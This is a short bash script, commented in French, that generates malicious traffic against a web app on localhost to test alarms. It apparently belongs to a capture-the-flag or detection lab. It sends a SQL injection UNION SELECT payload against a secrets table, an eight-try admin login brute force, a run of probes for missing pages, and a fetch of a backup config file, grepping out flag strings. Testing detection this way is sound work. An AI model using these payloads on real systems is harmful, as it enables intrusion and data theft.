#!/usr/bin/env bash
# Génère du trafic malveillant pour tester les alarmes (à lancer depuis l'hôte)
T="${1:-http://localhost:8080}"
curl -s "$T/search?q=zzz'%20UNION%20SELECT%20label,flag%20FROM%20secrets--%20-" | grep -o 'flag{[^}]*}'
for i in $(seq 1 8); do curl -s -o /dev/null -d "u=admin&p=bad$i" "$T/login"; done
for i in $(seq 1 20); do curl -s -o /dev/null "$T/nope$i"; done
curl -s "$T/backup/db_config.bak" | grep -o 'flag{[^}]*}'
